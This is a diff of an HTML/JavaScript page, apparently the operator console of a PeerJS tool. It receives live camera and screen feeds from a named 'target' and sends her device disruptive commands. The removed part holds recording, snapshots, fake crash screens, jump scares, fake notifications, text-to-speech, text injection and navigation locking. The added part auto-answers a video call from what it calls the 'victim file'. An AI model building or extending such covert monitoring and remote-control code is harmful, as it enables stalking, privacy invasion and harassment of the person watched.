@@ -1,368 +1,50 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>ROOT@CENTRAL-COMMAND: NAYANIKA_JOURNEY</title>
+    <title>Connection Test: ADMIN</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --primary: #0f0;
-            --secondary: #00f3ff;
-            --danger: #ff003c;
-            --bg: #050505;
-            --panel-bg: rgba(0, 20, 0, 0.85);
-        }
-
-        /* --- GLOBAL RESET & CRT EFFECT --- */
-        * { box-sizing: border-box; outline: none; }
-        
-        body {
-            background-color: var(--bg);
-            color: var(--primary);
-            font-family: 'Share Tech Mono', monospace;
-            margin: 0; padding: 20px;
-            overflow-y: auto; 
-            min-height: 100vh;
-            background-image: 
-                linear-gradient(rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.8)),
-                repeating-linear-gradient(0deg, transparent, transparent 1px, #001100 2px, #001100 3px);
-            background-size: cover;
-            background-attachment: fixed;
-        }
-
-        body::after {
-            content: " "; display: block; position: fixed;
-            top: 0; left: 0; bottom: 0; right: 0;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
-            z-index: 999; background-size: 100% 2px, 3px 100%; pointer-events: none;
-        }
-
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: #000; }
-        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 4px; }
-
-        h1 {
-            text-align: center; font-size: 24px; text-transform: uppercase; letter-spacing: 8px;
-            border-bottom: 2px solid var(--primary); margin: 0 0 20px 0; padding-bottom: 10px;
-            text-shadow: 0 0 10px var(--primary); position: relative;
-        }
-        h1::before { content: "[ SYSTEM_ID: 99-ASH-X ]"; position: absolute; left: 0; font-size: 10px; opacity: 0.7; bottom: 5px; }
-        h1::after { content: "STATUS: CONNECTED"; position: absolute; right: 0; font-size: 10px; color: var(--secondary); bottom: 5px; }
-
-        .main-layout {
-            display: grid; grid-template-columns: 350px 1fr 350px; gap: 15px;
-            height: auto; max-width: 1600px; margin: 0 auto;
-        }
-        @media (max-width: 1100px) { .main-layout { grid-template-columns: 1fr; } }
-
-        .panel-box {
-            border: 1px solid var(--primary); background: var(--panel-bg);
-            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1); position: relative;
-            display: flex; flex-direction: column; padding: 2px; margin-bottom: 20px;
-        }
-        .panel-box::before { content: ""; position: absolute; top: -1px; left: -1px; width: 10px; height: 10px; border-top: 2px solid var(--primary); border-left: 2px solid var(--primary); }
-        .panel-box::after { content: ""; position: absolute; bottom: -1px; right: -1px; width: 10px; height: 10px; border-bottom: 2px solid var(--primary); border-right: 2px solid var(--primary); }
-
-        .p-head { background: var(--primary); color: black; font-weight: bold; padding: 5px 10px; font-size: 12px; text-transform: uppercase; display: flex; justify-content: space-between; }
-
-        .chat-panel { height: 400px; }
-        #chat-log { flex: 1; overflow-y: auto; padding: 10px; font-size: 13px; font-family: 'Courier New', monospace; }
-        .m-n { color: var(--secondary); text-shadow: 0 0 5px var(--secondary); margin-bottom: 5px; }
-        .m-r { color: var(--primary); text-align: right; margin-bottom: 5px; }
-        
-        input[type="text"], select {
-            background: #000; border: none; border-top: 1px solid var(--primary);
-            color: var(--primary); padding: 15px; font-family: inherit; font-size: 14px; width: 100%;
-        }
-        input[type="text"]:focus { background: #001a00; }
-
-        .monitor-frame { border: 1px solid #333; background: #000; margin-bottom: 15px; position: relative; height: 350px; overflow: hidden; }
-        video { width: 100%; height: 100%; object-fit: cover; opacity: 0.9; }
-        
-        .hud-crosshair { position: absolute; top: 50%; left: 50%; width: 20px; height: 20px; border: 1px solid rgba(0, 255, 0, 0.3); transform: translate(-50%, -50%); pointer-events: none; }
-        .status-tag { position: absolute; top: 10px; right: 10px; background: rgba(0, 0, 0, 0.7); border: 1px solid var(--primary); color: var(--primary); padding: 2px 8px; font-size: 10px; letter-spacing: 1px; }
-
-        .cyber-btn {
-            background: rgba(0, 20, 0, 0.6); border: 1px solid var(--primary); color: var(--primary);
-            padding: 10px; cursor: pointer; font-family: inherit; font-size: 11px; text-transform: uppercase;
-            transition: all 0.2s; position: relative; overflow: hidden; width: 100%; margin-bottom: 5px;
-        }
-        .cyber-btn:hover { background: var(--primary); color: black; box-shadow: 0 0 15px var(--primary); }
-
-        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; padding: 10px; }
-        .btn-grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 5px; padding: 10px; }
-
-        .overlay-controls { position: absolute; bottom: 10px; left: 10px; right: 10px; display: flex; justify-content: space-between; z-index: 10; }
-        .rec-btn { background: rgba(0,0,0,0.7); border: 1px solid var(--danger); color: var(--danger); padding: 5px 15px; font-weight: bold; }
-        .rec-btn.rec-active { background: var(--danger); color: white; animation: blink 1s infinite; }
-        .snap-btn { background: rgba(0,0,0,0.7); border: 1px solid var(--secondary); color: var(--secondary); padding: 5px 15px; font-weight: bold; }
-
-        .progress-bar { width: 100%; height: 8px; background: #111; border: 1px solid #333; margin-top: 5px; }
-        #fill { height: 100%; background: repeating-linear-gradient(45deg, var(--primary), var(--primary) 10px, #003300 10px, #003300 20px); width: 0%; transition: width 0.5s; }
-
-        /* 🔥 NEW HACKER STYLES */
-        .danger-zone { border-color: var(--danger); }
-        .danger-zone .p-head { background: var(--danger); color: white; }
-        .danger-input { border-color: var(--danger) !important; color: var(--danger) !important; }
-        .danger-btn { border-color: var(--danger); color: var(--danger); }
-        .danger-btn:hover { background: var(--danger); color: white; }
-        
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-        
-        #initBtn { width: 100%; padding: 20px; font-size: 18px; letter-spacing: 5px; background: black; color: var(--primary); border: 2px solid var(--primary); cursor: pointer; margin-bottom: 20px; text-shadow: 0 0 10px var(--primary); }
+        body { background: #222; color: #fff; font-family: sans-serif; text-align: center; }
+        video { width: 80%; max-width: 600px; border: 5px solid #0f0; background: #000; margin-top: 20px; }
+        #log { color: #ccc; font-family: monospace; margin-top: 10px; }
     </style>
 </head>
 <body>
-
-    <h1>[ CENTRAL_COMMAND_VER_2.4 ]</h1>
-    <button onclick="startMonitor()" id="initBtn">>> INITIALIZE SECURE UPLINK <<</button>
-
-    <div class="main-layout">
-        
-        <!-- LEFT: COMMS & BASIC -->
-        <div>
-            <div class="panel-box chat-panel">
-                <div class="p-head">SECURE_MESSENGER</div>
-                <div id="chat-log"><div style="color:#555">> Waiting...</div></div>
-                <input type="text" id="chatInput" placeholder="CMD / MESSAGE..." onkeydown="if(event.key==='Enter') sendChat()">
-            </div>
-
-            <!-- 🔥 NEW: VOICE OF GOD -->
-            <div class="panel-box">
-                <div class="p-head" style="background: var(--secondary)">VOICE_OF_GOD (TTS)</div>
-                <div style="padding:10px;">
-                    <input type="text" id="ttsInput" placeholder="Type text to speak..." style="border-color:var(--secondary); color:var(--secondary); margin-bottom:5px;">
-                    <button class="cyber-btn" onclick="sendTTS()" style="border-color:var(--secondary); color:var(--secondary)">🔊 SPEAK ON DEVICE</button>
-                </div>
-            </div>
-
-             <!-- 🔥 NEW: LIVE VANDALISM -->
-             <div class="panel-box">
-                <div class="p-head" style="background: orange">LIVE_TEXT_INJECTOR</div>
-                <div style="padding:10px;">
-                    <input type="text" id="vandalInput" placeholder="Replace heading text..." style="border-color:orange; color:orange; margin-bottom:5px;">
-                    <button class="cyber-btn" onclick="sendVandal()" style="border-color:orange; color:orange">🖊️ OVERWRITE SCREEN</button>
-                </div>
-            </div>
-        </div>
-
-        <!-- CENTER: VISUALS -->
-        <div>
-            <div class="monitor-frame">
-                <video id="remoteVideo" autoplay playsinline style="transform: scaleX(-1);"></video>
-                <div class="hud-crosshair"></div>
-                <div class="status-tag">LIVE_CAM_01</div>
-                <div class="overlay-controls">
-                    <button id="recordBtn" class="cyber-btn rec-btn" onclick="toggleRecord()">REC ●</button>
-                    <button id="snapBtn" class="cyber-btn snap-btn" onclick="takePhoto()">SNAP 📷</button>
-                </div>
-            </div>
-            <div class="monitor-frame" style="border-color: var(--secondary); height: 250px;">
-                <video id="screenVideo" autoplay playsinline></video>
-                <div class="status-tag" style="border-color: var(--secondary); color: var(--secondary);">SCREEN_UPLINK</div>
-            </div>
-            <div class="panel-box">
-                <div class="p-head">MISSION_STATUS</div>
-                <div style="padding:10px;">
-                    <div style="font-size:12px; display:flex; justify-content:space-between;">
-                        <span>TARGET: NAYANIKA</span> <span id="chap-desc">WAITING...</span>
-                    </div>
-                    <div class="progress-bar"><div id="fill"></div></div>
-                    <button id="grantBtn" class="cyber-btn" style="margin-top:10px; border-style:dashed; color:var(--danger)" onclick="grantAccess()">[ ! ] AUTHORIZE PROCEED [ ! ]</button>
-                </div>
-            </div>
-        </div>
-
-        <!-- RIGHT: ADVANCED OPS -->
-        <div>
-            <!-- STANDARD TOOLS -->
-            <div class="panel-box">
-                <div class="p-head">TACTICAL_OVERRIDES</div>
-                <div style="padding: 10px;">
-                    <button id="lockBtn" class="cyber-btn" onclick="toggleLock()">🔓 NAV: FREE</button>
-                    <div class="btn-grid">
-                        <button class="cyber-btn" onclick="sendCmd('SHAKE')">SHAKE</button>
-                        <button class="cyber-btn" onclick="sendCmd('MATRIX')">MATRIX</button>
-                        <button class="cyber-btn" onclick="sendCmd('GRAY')">BW_FILT</button>
-                        <button class="cyber-btn" onclick="sendCmd('FLIP')">INVERT</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- 🔥 ADVANCED WARFARE -->
-            <div class="panel-box danger-zone">
-                <div class="p-head">ADVANCED_WARFARE</div>
-                <div style="padding:10px;">
-                    
-                    <!-- PUPPET MASTER -->
-                    <label style="font-size:10px; color:var(--danger);">PUPPET MASTER (FORCE CHAPTER)</label>
-                    <div style="display:flex; gap:5px; margin-bottom:10px;">
-                        <input type="number" id="jumpChap" placeholder="ID" class="danger-input" style="width:50px;">
-                        <button class="cyber-btn danger-btn" onclick="sendJump()">WARP >></button>
-                    </div>
-
-                    <div class="btn-grid">
-                        <button class="cyber-btn danger-btn" onclick="sendCmd('BSOD')">💻 BSOD CRASH</button>
-                        <button class="cyber-btn danger-btn" onclick="sendCmd('JUMPSCARE')">👻 JUMP SCARE</button>
-                    </div>
-                    <div class="btn-grid">
-                        <button class="cyber-btn danger-btn" onclick="sendCmd('CRASH')">🚫 SYS FREEZE</button>
-                        <button class="cyber-btn" style="border-color:yellow; color:yellow" onclick="sendCmd('NOTIFY')">🔔 FAKE NOTIF</button>
-                    </div>
-                </div>
-            </div>
-
-             <div class="panel-box">
-                <div class="p-head">AUDIO_INJECTION</div>
-                <div class="btn-grid-3">
-                    <button class="cyber-btn" onclick="sendCmd('SONG_1')">ROMANCE</button>
-                    <button class="cyber-btn" onclick="sendCmd('SONG_2')">FUNNY</button>
-                    <button class="cyber-btn" onclick="sendCmd('SONG_3')">SAD</button>
-                </div>
-            </div>
-
-        </div>
-    </div>
+    <h1>ADMIN RECEIVER</h1>
+    <div id="log">Initializing...</div>
+    <video id="remote-video" autoplay playsinline></video>
 
     <script>
-        // --- UPDATED CONNECTIVITY FOR MOBILE & LONG DISTANCE ---
-        const receiverID = 'rudra_nayanika_live_998877_exclusive';
-        let peer, activeConn, isLocked = false;
-        let mediaRecorder, recordedChunks = [], isRecording = false;
+        const MY_ID = 'test_admin_unique_id_999'; // Matches victim file
 
-        function startMonitor() {
-            document.getElementById('initBtn').innerText = "ESTABLISHING UPLINK...";
+        const peer = new Peer(MY_ID, {
+            debug: 2,
+            config: {
+                iceServers: [
+                    { urls: 'stun:stun.l.google.com:19302' },
+                    { urls: 'stun:stun1.l.google.com:19302' }
+                ]
+            }
+        });
+
+        peer.on('open', (id) => {
+            document.getElementById('log').innerText = "Server Online. ID: " + id + "\nWaiting for mobile connection...";
+        });
+
+        peer.on('call', (call) => {
+            document.getElementById('log').innerText = "INCOMING CALL RECEIVED! Answering...";
+            call.answer(); // Answer the call automatically
             
-            // 🔥 FIXED: Added ICE Servers for Mobile/Long Distance support
-            peer = new Peer(receiverID, {
-                debug: 2,
-                config: {
-                    iceServers: [
-                        { urls: 'stun:stun.l.google.com:19302' },
-                        { urls: 'stun:stun1.l.google.com:19302' },
-                        { urls: 'stun:stun2.l.google.com:19302' }
-                    ]
-                }
+            call.on('stream', (remoteStream) => {
+                document.getElementById('log').innerText = "VIDEO FEED CONNECTED SUCCESS!";
+                const video = document.getElementById('remote-video');
+                video.srcObject = remoteStream;
             });
-            
-            peer.on('open', (id) => {
-                document.getElementById('initBtn').style.display = 'none';
-                logSystem("SERVER ONLINE. ID: " + id);
-                logSystem("WAITING FOR TARGET...");
-            });
+        });
 
-            peer.on('connection', (conn) => {
-                activeConn = conn;
-                logSystem("TARGET CONNECTED SUCCESSFULLY!");
-                
-                conn.on('data', (data) => {
-                    if(data.type === 'PROGRESS') {
-                        document.getElementById('chap-desc').innerText = "CH " + data.chapter + " : " + data.name;
-                        document.getElementById('fill').style.width = (data.chapter/44*100) + '%';
-                    }
-                    if(data.type === 'CHAT_MSG') {
-                        document.getElementById('chat-log').innerHTML += `<div class="m-n">TARGET: ${data.text}</div>`;
-                        scrollChat();
-                    }
-                });
-                
-                conn.on('close', () => logSystem("TARGET DISCONNECTED"));
-            });
-
-            peer.on('call', (call) => {
-                logSystem("INCOMING VIDEO FEED...");
-                call.answer(); 
-                call.on('stream', (stream) => {
-                    if (call.metadata && call.metadata.type === 'screen-cast') {
-                        document.getElementById('screenVideo').srcObject = stream;
-                        logSystem("SCREEN SHARE ACTIVE");
-                    } else {
-                        document.getElementById('remoteVideo').srcObject = stream;
-                        logSystem("CAMERA FEED ACTIVE");
-                    }
-                });
-            });
-
-            peer.on('error', (err) => {
-                logSystem("ERROR: " + err.type);
-                if(err.type === 'unavailable-id') {
-                    logSystem("ID TAKEN. CLOSE OTHER TABS.");
-                }
-            });
-        }
-
-        function logSystem(msg) { document.getElementById('chat-log').innerHTML += `<div style="color:#0f0">> SYS: ${msg}</div>`; scrollChat(); }
-        function scrollChat() { const d = document.getElementById('chat-log'); d.scrollTop = d.scrollHeight; }
-
-        function sendChat() {
-            const val = document.getElementById('chatInput').value;
-            if(val && activeConn) {
-                activeConn.send({ type: 'CHAT_REPLY', text: val });
-                document.getElementById('chat-log').innerHTML += `<div class="m-r">YOU: ${val}</div>`;
-                document.getElementById('chatInput').value = ''; scrollChat();
-            }
-        }
-
-        // 🔥 NEW FUNCTIONS
-        function sendTTS() {
-            const val = document.getElementById('ttsInput').value;
-            if(val && activeConn) {
-                activeConn.send({ type: 'TTS', text: val });
-                logSystem(`TTS SENT: "${val}"`);
-                document.getElementById('ttsInput').value = '';
-            }
-        }
-
-        function sendVandal() {
-            const val = document.getElementById('vandalInput').value;
-            if(val && activeConn) {
-                activeConn.send({ type: 'EDIT_TEXT', text: val });
-                logSystem(`TEXT INJECTED: "${val}"`);
-            }
-        }
-
-        function sendJump() {
-            const val = document.getElementById('jumpChap').value;
-            if(val && activeConn) {
-                activeConn.send({ type: 'JUMP', chapter: parseInt(val) });
-                logSystem(`FORCED JUMP TO CHAPTER ${val}`);
-            }
-        }
-
-        // EXISTING FUNCTIONS
-        function toggleLock() {
-            isLocked = !isLocked;
-            const btn = document.getElementById('lockBtn');
-            if(isLocked) { sendCmd('LOCK_NAV'); btn.style.background='red'; btn.innerText='🔒 NAV: LOCKED'; }
-            else { sendCmd('UNLOCK_NAV'); btn.style.background=''; btn.innerText='🔓 NAV: FREE'; }
-        }
-
-        function grantAccess() { if(activeConn) { activeConn.send('GRANT_ACCESS'); document.getElementById('grantBtn').innerText = "ACCESS GRANTED [ OK ]"; } }
-        function sendCmd(cmd) { if(activeConn) activeConn.send(cmd); }
-        
-        // REC & SNAP
-        function takePhoto() {
-            const v = document.getElementById('remoteVideo'); if(!v.srcObject) return;
-            const c = document.createElement('canvas'); c.width=v.videoWidth; c.height=v.videoHeight;
-            c.getContext('2d').drawImage(v,0,0);
-            const a = document.createElement('a'); a.href=c.toDataURL('image/png'); a.download=`SNAP_${Date.now()}.png`; a.click();
-        }
-        function toggleRecord() {
-            const v = document.getElementById('remoteVideo'); const btn = document.getElementById('recordBtn');
-            if(!v.srcObject) return;
-            if(!isRecording) {
-                recordedChunks = []; mediaRecorder = new MediaRecorder(v.srcObject);
-                mediaRecorder.ondataavailable = e => { if(e.data.size>0) recordedChunks.push(e.data); };
-                mediaRecorder.onstop = () => {
-                    const b = new Blob(recordedChunks, {type:'video/webm'});
-                    const a = document.createElement('a'); a.href=URL.createObjectURL(b); a.download=`REC_${Date.now()}.webm`; a.click();
-                };
-                mediaRecorder.start(); isRecording = true; btn.innerText="STOP ■"; btn.classList.add('rec-active');
-            } else {
-                mediaRecorder.stop(); isRecording = false; btn.innerText="REC ●"; btn.classList.remove('rec-active');
-            }
-        }
+        peer.on('error', (err) => {
+            document.getElementById('log').innerText = "Error: " + err.type;
+        });
     </script>
 </body>
 </html>
